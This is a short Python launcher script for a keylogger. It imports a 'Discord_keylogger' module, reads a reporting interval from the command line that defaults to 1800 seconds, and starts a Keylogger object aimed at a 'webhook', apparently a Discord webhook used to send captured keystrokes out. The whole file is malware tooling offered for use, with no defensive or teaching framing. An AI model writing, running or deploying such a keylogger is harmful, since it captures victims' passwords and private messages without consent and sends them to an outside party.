#!/usr/bin/env python
import argparse
import Discord_keylogger

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--timedelay", dest="t_delay", help=("Enter time delay in seconds"))
    options = parser.parse_args()
    if not options.t_delay:
        options.t_delay = 1800
    return options

try:
    if __name__ == "__main__":
        my_keylogger = Discord_keylogger.Keylogger(int(get_arguments().t_delay), "webhook")
        my_keylogger.start()
except KeyboardInterrupt:
    print("CTRL+C detected....Exiting Keylogger")
